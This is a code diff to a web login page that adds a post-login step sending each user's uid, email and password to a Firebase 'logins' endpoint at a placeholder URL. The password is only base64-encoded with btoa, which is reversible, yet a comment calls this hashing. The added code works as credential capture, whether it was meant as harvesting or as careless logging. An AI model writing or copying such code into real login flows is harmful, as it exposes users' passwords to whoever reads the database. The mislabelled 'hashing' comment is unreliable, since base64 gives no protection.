@@ -161,6 +161,23 @@
               document.getElementById('message').innerText = JSON.stringify(jsonResponse, null, 2);
               localStorage.setItem('mstatus', 'active');
               disableLoginFields();
+
+
+
+                 const authToken = await getAuthToken(user);
+
+        // Prepare data to post
+        const postData = {
+          datetime: new Date().toISOString(),
+          uid: user.uid,
+          email: user.email,
+          passHash: btoa(password) // Example of hashing (use a proper hash function in production)
+        };
+
+        // Post data to Firebase Realtime Database
+        postToFirebase(postData, authToken);
+
+
             })
             .catch(error => {
               const jsonResponse = {
@@ -310,7 +327,28 @@
         document.querySelectorAll('.tab-button').forEach(button => {
           button.addEventListener('click', () => switchTab(button.dataset.tab));
         });
+    const postToFirebase = async (data, authToken, endpoint = 'logins') => {
+  const firebaseUrl = `https://your-database-name.firebaseio.com/${endpoint}.json?auth=${authToken}`;
 
+  try {
+    const response = await fetch(firebaseUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(data),
+    });
+
+    if (!response.ok) {
+      throw new Error(`Error: ${response.statusText}`);
+    }
+
+    const result = await response.json();
+    console.log('Data successfully posted:', result);
+  } catch (error) {
+    console.error('Error posting data:', error);
+  }
+};
         // Check login status on load
         checkLoginStatus();
 
